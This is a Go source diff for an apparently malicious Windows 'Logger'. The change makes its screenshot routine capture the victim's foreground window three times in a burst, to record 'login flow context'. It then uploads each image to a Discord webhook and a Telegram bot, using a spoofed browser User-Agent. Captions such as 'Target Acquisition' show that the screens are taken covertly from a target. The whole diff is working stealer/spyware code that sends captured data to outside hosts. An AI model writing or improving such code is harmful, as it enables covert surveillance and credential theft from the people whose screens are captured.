@@ -797,98 +797,101 @@ func (l *Logger) checkScreenshotTrigger(win string, isImmediate bool) {
 }
 
 // takeAndSendScreenshot encodes a heavily compressed JPEG natively and ships it directly via Multipart POST.
+// It takes a batch of 3 screenshots spaced 2.5 seconds apart to capture login flow context.
 func (l *Logger) takeAndSendScreenshot(win string) {
-	// Slight delay to allow the target page/window to render visually
-	time.Sleep(800 * time.Millisecond)
-
-	n := screenshot.NumActiveDisplays()
-	if n <= 0 {
-		return
-	}
-
-	var bounds image.Rectangle
-	// 1. TRY WINDOW BRACKETING: Only capture the active window for efficiency.
-	hwnd, _, _ := procGetForeground.Call()
-	if hwnd != 0 {
-		var rect RECT
-		ret, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&rect)))
-		if ret != 0 {
-			bounds = image.Rect(int(rect.Left), int(rect.Top), int(rect.Right), int(rect.Bottom))
+	for i := 0; i < 3; i++ {
+		if i == 0 {
+			// Slight delay for the first capture to allow the target page/window to render visually
+			time.Sleep(800 * time.Millisecond)
+		} else {
+			// Delay between subsequent batch captures
+			time.Sleep(2500 * time.Millisecond)
 		}
-	}
 
-	// 2. FALLBACK: Full screen if window rect fails or is empty
-	if bounds.Empty() {
-		bounds = screenshot.GetDisplayBounds(0)
-	}
+		n := screenshot.NumActiveDisplays()
+		if n <= 0 {
+			return
+		}
 
-	if bounds.Empty() {
-		return
-	}
+		var bounds image.Rectangle
+		// 1. TRY WINDOW BRACKETING: Only capture the active window for efficiency.
+		hwnd, _, _ := procGetForeground.Call()
+		if hwnd != 0 {
+			var rect RECT
+			ret, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&rect)))
+			if ret != 0 {
+				bounds = image.Rect(int(rect.Left), int(rect.Top), int(rect.Right), int(rect.Bottom))
+			}
+		}
 
-	img, err := screenshot.CaptureRect(bounds)
-	if err != nil {
-		return
-	}
+		// 2. FALLBACK: Full screen if window rect fails or is empty
+		if bounds.Empty() {
+			bounds = screenshot.GetDisplayBounds(0)
+		}
 
-	// Use pooled buffer to avoid repeated heap allocations.
-	buf := screenshotBufPool.Get().(*bytes.Buffer)
-	buf.Reset()
-	defer screenshotBufPool.Put(buf)
+		if bounds.Empty() {
+			continue
+		}
 
-	// Encode 60% quality JPEG — good balance of clarity and size.
-	err = jpeg.Encode(buf, img, &jpeg.Options{Quality: 60})
-	if err != nil {
-		return
-	}
-	
-	imageData := buf.Bytes()
-	client := sharedHTTPClient
+		img, err := screenshot.CaptureRect(bounds)
+		if err != nil {
+			continue
+		}
 
-	// 1. Stream RAM buffer to Discord multipart
-	if l.Config.WebhookURL != "" {
-		body := &bytes.Buffer{}
-		writer := multipart.NewWriter(body)
+		// Use pooled buffer to avoid repeated heap allocations.
+		buf := screenshotBufPool.Get().(*bytes.Buffer)
+		buf.Reset()
+
+		// Encode 60% quality JPEG — good balance of clarity and size.
+		err = jpeg.Encode(buf, img, &jpeg.Options{Quality: 60})
+		if err != nil {
+			screenshotBufPool.Put(buf)
+			continue
+		}
 		
-		part, err := writer.CreateFormFile("file1", "capture.jpeg")
-		if err == nil {
-			part.Write(imageData)
-		}
+		imageData := buf.Bytes()
+		screenshotBufPool.Put(buf) // safe to return buffer since we copied bytes
+		
+		client := sharedHTTPClient
 
-		payloadBytes, _ := json.Marshal(map[string]interface{}{
-			"content": fmt.Sprintf("📸 **Target Acquisition**\n`%s`", win),
-		})
-		writer.WriteField("payload_json", string(payloadBytes))
-		writer.Close()
+		// 1. Stream RAM buffer to Discord multipart
+		if l.Config.WebhookURL != "" {
+			body := &bytes.Buffer{}
+			writer := multipart.NewWriter(body)
+			
+			part, err := writer.CreateFormFile("file1", fmt.Sprintf("capture_batch_%d.jpeg", i+1))
+			if err == nil {
+				part.Write(imageData)
+			}
+			
+			writer.WriteField("content", fmt.Sprintf("📸 **Context Capture (%d/3)**\nWindow: `%s`", i+1, win))
+			writer.Close()
 
-		req, err := http.NewRequest("POST", l.Config.WebhookURL, body)
-		if err == nil {
+			req, _ := http.NewRequest("POST", l.Config.WebhookURL, body)
 			req.Header.Set("Content-Type", writer.FormDataContentType())
-			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
 			client.Do(req)
 		}
-	}
 
-	// 2. Stream RAM buffer to Telegram multipart
-	if l.Config.TelegramToken != "" && l.Config.TelegramChatID != "" {
-		tgBody := &bytes.Buffer{}
-		tgWriter := multipart.NewWriter(tgBody)
-		
-		tgWriter.WriteField("chat_id", l.Config.TelegramChatID)
-		tgWriter.WriteField("caption", fmt.Sprintf("📸 *Target Acquisition*\n`%s`", win))
-		tgWriter.WriteField("parse_mode", "Markdown")
+		// 2. Stream RAM buffer to Telegram multipart
+		if l.Config.TelegramToken != "" && l.Config.TelegramChatID != "" {
+			body := &bytes.Buffer{}
+			writer := multipart.NewWriter(body)
 
-		tgPart, err := tgWriter.CreateFormFile("photo", "capture.jpeg")
-		if err == nil {
-			tgPart.Write(imageData)
-		}
-		tgWriter.Close()
+			writer.WriteField("chat_id", l.Config.TelegramChatID)
+			writer.WriteField("caption", fmt.Sprintf("📸 *Context Capture (%d/3)*\nWindow: `%s`", i+1, win))
+			writer.WriteField("parse_mode", "Markdown")
+			
+			part, err := writer.CreateFormFile("photo", fmt.Sprintf("capture_batch_%d.jpeg", i+1))
+			if err == nil {
+				part.Write(imageData)
+			}
+			writer.Close()
 
-		tgURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendPhoto", l.Config.TelegramToken)
-		tgReq, err := http.NewRequest("POST", tgURL, tgBody)
-		if err == nil {
-			tgReq.Header.Set("Content-Type", tgWriter.FormDataContentType())
-			client.Do(tgReq)
+			url := fmt.Sprintf("https://api.telegram.org/bot%s/sendPhoto", l.Config.TelegramToken)
+			req, _ := http.NewRequest("POST", url, body)
+			req.Header.Set("Content-Type", writer.FormDataContentType())
+			client.Do(req)
 		}
 	}
 }
